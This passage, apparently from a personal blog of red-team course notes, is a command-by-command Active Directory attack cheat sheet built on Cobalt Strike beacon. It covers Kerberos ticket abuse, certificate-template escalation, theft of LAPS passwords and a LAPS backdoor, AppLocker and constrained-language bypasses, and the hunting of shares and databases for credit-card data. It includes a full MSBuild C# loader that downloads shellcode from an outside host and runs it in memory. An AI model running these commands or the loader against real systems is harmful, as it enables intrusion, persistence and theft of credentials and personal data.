PS&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password<span style=color:#960050;background-color:#1e0010>:</span>oIrpupAtF1YCXaw /user<span style=color:#960050;background-color:#1e0010>:</span>EvilComputer$ /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io
  
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>EvilComputer$ /aes256<span style=color:#960050;background-color:#1e0010>:</span>7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
  
<span style=color:#75715e># 8. Perform Few enumerations to get access to the forest.</span>
  
<span style=color:#75715e># Kerberoasting / ASRepRoasting / Set SPN</span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=user)(servicePrincipalName=*))</span><span style=color:#e6db74>&#34;</span> --attributes cn,servicePrincipalName,samAccountName --domain msp.org
  
beacon&gt; powerpick Get-DomainUser -SPN -Domain msp.org
beacon&gt; powerpick Get-DomainUser -PreauthNotRequired -Verbose -Domain msp.org
beacon&gt; powerpick Find-InterestingDomainAcl -ResolveGUIDs -Domain msp.org | ?{$_.IdentityReferenceName <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>CYBER</span><span style=color:#e6db74>$</span><span style=color:#e6db74>&#34;</span>}
  
<span style=color:#75715e># Unconstrained Delegation </span>
beacon&gt; powerpick Get-DomainComputer -UnConstrained -Domain msp.org
beacon&gt; powerpick Get-DomainComputer -UnConstrained -Domain msp.org
  
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(ObjectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><span style=color:#e6db74>&#34;</span> --attributes cn,dnshostname --domain msp.org
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(ObjectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><span style=color:#e6db74>&#34;</span> --attributes cn,dnshostname --domain msp.org
  
<span style=color:#75715e># Constrained Delegation</span>
beacon&gt; powerpick Get-DomainUser -TrustedToAuth -Domain msp.org
beacon&gt; powerpick Get-DomainComputer -TrustedToAuth -Domain msp.org
  
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))</span><span style=color:#e6db74>&#34;</span> --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json --domain msp.org
  
<span style=color:#75715e># Vulnerable Certificate Templates</span>
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable /domain<span style=color:#960050;background-color:#1e0010>:</span>msp.org
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /enrolleeSuppliesSubject /domain<span style=color:#960050;background-color:#1e0010>:</span>msp.org
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca<span style=color:#960050;background-color:#1e0010>:</span>ad.msp.org\root-ca /template<span style=color:#960050;background-color:#1e0010>:</span>MSPUserTemplate /altname<span style=color:#960050;background-color:#1e0010>:</span>Administrator /domain<span style=color:#960050;background-color:#1e0010>:</span>msp.org
<span style=color:#75715e># Certify doesn&#39;t work well across outbound trust, So to abuse such attack scenario either we have to modify the Certify or we can use native certreq tool (https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certreq_1).</span>
<span style=color:#75715e># For OutBound Forests the Certify fails , So we have to modify it. Or for manually performing this attack using certreq follow belo links.</span>
- <span style=color:#66d9ef>For</span> help check this
[https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/GhostPack/Certify/issues/13<span style=color:#75715e>#issuecomment-1716046133](https://github.com/GhostPack/Certify/issues/13#issuecomment-1716046133)</span>
  
</code></pre></div></li></ul><h3 id=laps>LAPS</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e>## Abusing LAPS (Local Administrator Password Solution)</span>

<span style=color:#75715e># 1. Enumerate for presence of LAPS and GPO Policy implementing the Laps.</span>
<span style=color:#75715e># 1.1 Check if, LAPS client is installed on local machine</span>
beacon&gt; ls C:\Program Files\LAPS\CSE
<span style=color:#75715e># 1.2 Check for, Computer Object having ms-Mcs-AdmPwdExpirationTime attribute is set to Not Null.</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainComputer | ? { $_.<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>ms-Mcs-AdmPwdExpirationTime</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-ne</span> $null } | select dnsHostName

<span style=color:#75715e># 2. Enumerate GPO which are used to deploy LAPS configurations</span>
<span style=color:#75715e># 2.1 Check for GPOs that have &#34;LAPS&#34; or some other descriptive term in the name.</span>
beacon&gt; powerpick Get-DomainGPO | ? { $_.DisplayName <span style=color:#f92672>-like</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>*laps*</span><span style=color:#e6db74>&#34;</span> } | select DisplayName, Name, GPCFileSysPath | fl
<span style=color:#75715e># 2.2 Download LAPS configuration (Using name or cn attribute values from Laps GPO)</span>
beacon&gt; ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine
beacon&gt; download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol
<span style=color:#75715e># 2.3 Parse the LAPS GPO Policy file downloaded in previous step</span>
PS C:\Users\Attacker&gt; Parse-PolFile .\Desktop\Registry.pol

<span style=color:#75715e># 3. Finding Principals which can read the LAPS Passwords or ms-Mcs-AdmPwd Attribute.</span>
<span style=color:#75715e># 3.1 Search DACL of each computer to find the read rights</span>
beacon&gt; powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType <span style=color:#f92672>-eq</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>ms-Mcs-AdmPwd</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-and</span> $_.ActiveDirectoryRights <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>ReadProperty</span><span style=color:#e6db74>&#34;</span> } | select ObjectDn, SecurityIdentifier | fl
beacon&gt; powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainGroupMember -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>DEV\Developers</span><span style=color:#e6db74>&#34;</span> -Domain dev.cyberbotic.io -Recurse
<span style=color:#75715e># 3.2 Use LAPS Toolkit to find groups that have delegated read rights at OU and Computer level</span>
beacon&gt; powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
beacon&gt; powerpick Find-LAPSDelegatedGroups
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainGroupMember -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>DEV\Developers</span><span style=color:#e6db74>&#34;</span> -Domain dev.cyberbotic.io -Recurse
<span style=color:#75715e># 3.3 Find-AdmPwdExtendedRights goes a little deeper and queries each individual computer for users that have &#34;All Extended Rights&#34;. This will reveal any users that can read the attribute without having had it specifically delegated to them.</span>
beacon&gt; powerpick Find-AdmPwdExtendedRights

<span style=color:#75715e># 4. Reading LAPS Passwords or ms-Mcs-AdmPwd Attribute and using it to gain access.</span>
<span style=color:#75715e># 4.1 View the LAPS password for given machine (From User Session having required rights)</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
beacon&gt; powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
<span style=color:#75715e># 4.2 Use the laps password to gain access</span>
beacon&gt; make_token .\LapsAdmin 1N3FyjJR5L18za
beacon&gt; ls \\wkstn-1\c$

<span style=color:#75715e># 5. Modifying Password Expiration Protection for Persistence</span>
<span style=color:#75715e># 5.1 Make sure that LAPS policy settings PwdExpirationProtectionEnabled is not enabled , then only we can set the Password Expiration to a longer time, else it will trigger a password reset.</span>
PS C:\Users\Attacker&gt; Parse-PolFile .\Desktop\Registry.pol
<span style=color:#75715e># 5.2 Check the current Expiration time</span>
beacon&gt; powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
<span style=color:#75715e># 5.3 Set Far Future date as expiry (Only machine can set its Password) (Use www.epochconverter.com/ldap)</span>
beacon&gt; run hostname
beacon&gt; getuid
beacon&gt; powerpick Set-DomainObject -Identity wkstn-1 -Set @{<span style=color:#e6db74>&#39;ms-Mcs-AdmPwdExpirationTime&#39;</span> = <span style=color:#e6db74>&#39;136257686710000000&#39;</span>} -Verbose

<span style=color:#75715e># 6. LAPS Backdoor</span>
- Modify the AdmPwd.PS.dll and AdmPwd.Utils.dll file located at C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\ location to log the LAPS password everytime it is viewed by the admin user (Chevk Notes)
</code></pre></div><h3 id=applocker>AppLocker</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e>## Applocker Enumeration</span>

<span style=color:#75715e># 1. On Local System</span>
<span style=color:#75715e># 1.1 Using powershell on local system</span>
beacon&gt; powershell $ExecutionContext.SessionState.LanguageMode
<span style=color:#75715e># 1.2 Enumerate the Applocker policy via Local Windows registry on machine </span>
PS C:\Users\Administrator&gt; Get-ChildItem <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HKLM:Software\Policies\Microsoft\Windows\SrpV2</span><span style=color:#e6db74>&#34;</span>
PS C:\Users\Administrator&gt; Get-ChildItem <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe</span><span style=color:#e6db74>&#34;</span>

<span style=color:#75715e># 2. From any system - Enumerate the Applocker policy via GPO</span>
beacon&gt; powerpick Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName <span style=color:#f92672>-like</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>*AppLocker*</span><span style=color:#e6db74>&#34;</span> } | select displayname, gpcfilesyspath
beacon&gt; download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol
PS C:\Users\Attacker&gt; Parse-PolFile .\Desktop\Registry.pol

<span style=color:#75715e>#-------------------------------------------------------------------------------------</span>
<span style=color:#75715e>## Writable Paths</span>
<span style=color:#75715e># 1. Navigating Laterally via PSEXEC is fine, as service binary is uploaded in C:\Winodws path which is by default whitelisted.</span>
<span style=color:#75715e># 2. Find the writable path within C:\winodws to bypass Applocker</span>
beacon&gt; powershell Get-Acl C:\Windows\Tasks | fl
<span style=color:#75715e># 3. In the default Applocker Policy , &#34;C:\Windows&#34; and &#34;C:\Program Files&#34; are whitelisted and we can run any binary from there, c:\Windows\Tasks is the directory where any standard user have write permissions.</span>
<span style=color:#75715e># 4. When enumerating the rules, you may also find additional weak rules that system administrators have put in. For example</span>
&lt;FilePathCondition Path=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>*\AppV\*</span><span style=color:#e6db74>&#34;</span>/&gt;
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e>## Using LOLBAS to execute arbitrary code or Beacon Payload.</span>

<span style=color:#75715e># If Applocker is enabled with strict policy, and most of the Binaries are not allowed to execute (like Powershell, External Binaries, Some specific directory binaries etc), then we can use Binaries From LOLBAS Project to execute our shellcode/payload/dll to get beacon.</span>
<span style=color:#75715e># LOLBAS Project - https://lolbas-project.github.io/#/execute</span>

<span style=color:#75715e>#-------------------------------------------------------------------------------------</span>

<span style=color:#75715e>## Using MSBuild.exe to execute C# code from a .csproj or .xml file</span>

<span style=color:#75715e># 1. Host http_x64.xprocess.bin via Site Management &gt; Host File</span>
<span style=color:#75715e># 2. Start execution using command</span>
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj

<span style=color:#75715e># 3. Contents of test.csproj file, which us using a c# loader to download and execute shellcode.</span>
&lt;Project ToolsVersion=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>4.0</span><span style=color:#e6db74>&#34;</span> xmlns=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>http://schemas.microsoft.com/developer/msbuild/2003</span><span style=color:#e6db74>&#34;</span>&gt;
  &lt;Target Name=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>MSBuild</span><span style=color:#e6db74>&#34;</span>&gt;
   &lt;MSBuildTest/&gt;
  &lt;/Target&gt;
   &lt;UsingTask
    TaskName=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>MSBuildTest</span><span style=color:#e6db74>&#34;</span>
    TaskFactory=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>CodeTaskFactory</span><span style=color:#e6db74>&#34;</span>
    AssemblyFile=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll</span><span style=color:#e6db74>&#34;</span> &gt;
     &lt;Task&gt;
      &lt;Code Type=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Class</span><span style=color:#e6db74>&#34;</span> Language=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>cs</span><span style=color:#e6db74>&#34;</span>&gt;
        &lt;![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest <span style=color:#960050;background-color:#1e0010>:</span>  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>http://nickelviper.com</span><span style=color:#e6db74>&#34;</span>;
                        shellcode = client.DownloadData(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>beacon.bin</span><span style=color:#e6db74>&#34;</span>);
                    }
      
                    var hKernel = LoadLibrary(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>kernel32.dll</span><span style=color:#e6db74>&#34;</span>);
                    var hVa = GetProcAddress(hKernel, <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>VirtualAlloc</span><span style=color:#e6db74>&#34;</span>);
                    var hCt = GetProcAddress(hKernel, <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>CreateThread</span><span style=color:#e6db74>&#34;</span>);

                    var va = Marshal.GetDelegateForFunctionPointer&lt;AllocateVirtualMemory&gt;(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer&lt;CreateThread&gt;(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    <span style=color:#66d9ef>return</span> true;
                }

            [DllImport(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>kernel32</span><span style=color:#e6db74>&#34;</span>, CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>kernel32</span><span style=color:#e6db74>&#34;</span>, CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>kernel32</span><span style=color:#e6db74>&#34;</span>)]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]&gt;
      &lt;/Code&gt;
    &lt;/Task&gt;
  &lt;/UsingTask&gt;
&lt;/Project&gt;

<span style=color:#75715e>#-------------------------------------------------------------------------------------</span>
<span style=color:#75715e>## Other LOLBAS Binaries that can be used to execute code can be found below</span>
<span style=color:#75715e># LOLBAS Project - https://lolbas-project.github.io/#/execute</span>

<span style=color:#75715e>## Using MsEdge.exe to execute beacon ( it will pop a window which will be visible to user, To avoid that we can use --headless msedge)</span>
<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</span><span style=color:#e6db74>&#34;</span> --disable-gpu-sandbox --gpu-launcher=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Windows\Tasks\smb3_x64.exe &amp;&amp;</span><span style=color:#e6db74>&#34;</span>
<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</span><span style=color:#e6db74>&#34;</span> --headless --disable-gpu-sandbox --gpu-launcher=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Windows\Tasks\smb3_x64.exe &amp;&amp;</span><span style=color:#e6db74>&#34;</span>
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e>## Powershell Contrained Language Mode</span>

<span style=color:#75715e># 1. Break out of PowerShell Constrained Language Mode by using an unmanaged PowerShell runspace</span>
beacon&gt; powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

beacon&gt; powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage
<span style=color:#75715e># 2. We can also achieve the FullLanguage Mode using the LOLBAS, For that we can use the C# loader which can execute a powershell commands. And then add it to a .csproj or .xml file, and execute this using msbuild.exe.</span>
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj

<span style=color:#75715e>#-------------------------------------------------------------------------------------</span>

<span style=color:#75715e>## Beacon DLL (DLLs are usually not restricted by Applocker due to performance reason)</span>

<span style=color:#75715e># DLL enforcement is not commonly enabled which allows us to call exported functions from DLLs on disk via rundll32.</span>
<span style=color:#75715e># Beacon&#39;s DLL payload exposes several exports including DllMain and StartW.  These can be changed in the Artifact Kit under src-main, dllmain.def.</span>
C:\Windows\System32\rundll32.exe http_x64.dll,StartW
</code></pre></div><h3 id=data-exfiltration>Data Exfiltration</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Enumerate Share</span>
beacon&gt; powerpick Invoke-ShareFinder
beacon&gt; powerpick Invoke-FileFinder
beacon&gt; powerpick Get-FileNetServer
beacon&gt; shell findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml
beacon&gt; Get-DecryptedCpassword

<span style=color:#75715e># Find accessible share having juicy information</span>
beacon&gt; powerpick Find-DomainShare -CheckShareAccess
beacon&gt; powerpick Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
beacon&gt; powerpick gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5

<span style=color:#75715e># Search for senstive data in directly accessible DB by keywords</span>
beacon&gt; powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status <span style=color:#f92672>-eq</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Accessible</span><span style=color:#e6db74>&#34;</span> } | Get-SQLColumnSampleDataThreaded -Keywords <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>email,address,credit,card</span><span style=color:#e6db74>&#34;</span> -SampleSize 5 | select instance, database, column, sample | ft -autosize

<span style=color:#75715e># Search for senstive data in DB links</span>
beacon&gt; powerpick Get-SQLQuery -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span> -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>select * from openquery(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#e6db74>sql-1.cyberbotic.io</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#e6db74>, &#39;select * from information_schema.tables&#39;)</span><span style=color:#e6db74>&#34;</span>

beacon&gt; powerpick Get-SQLQuery -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span> -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>select * from openquery(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#e6db74>sql-1.cyberbotic.io</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#e6db74>, &#39;select column_name from master.information_schema.columns where table_name=&#39;&#39;employees&#39;&#39;&#39;)</span><span style=color:#e6db74>&#34;</span>

beacon&gt; powerpick Get-SQLQuery -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span> -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>select * from openquery(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#e6db74>sql-1.cyberbotic.io</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#e6db74>, &#39;select top 5 first_name,gender,sort_code from master.dbo.employees&#39;)</span><span style=color:#e6db74>&#34;</span>
</code></pre></div><pre><code># Not able to migrate to another process using Inject Command (worked by choosing P2P 
beacon)

# Was facing some issues with doing the lateral movement by SYSTEM User
- But if we have access to NTLM hash, we can directly use PTH and JUMP to move laterally 
- Still Powerview functions don't work in this context, need to find a way
</code></pre><hr><h2 id=reference>Reference:</h2><p><a href=https://training.zeropointsecurity.co.uk/courses/red-team-ops>https://training.zeropointsecurity.co.uk/courses/red-team-ops</a></p></div></article><hr><div class=post-info></div></main></div><footer class=footer><div class=footer__inner></div><div class=footer__inner><div class=footer__content><span></span><span>Made with 💛 by <a href=/>An0nud4y</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js integrity="sha512-3HFukJLJggt3+W2ilNASCu6xibW86pdSMJ6+on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script></body></html>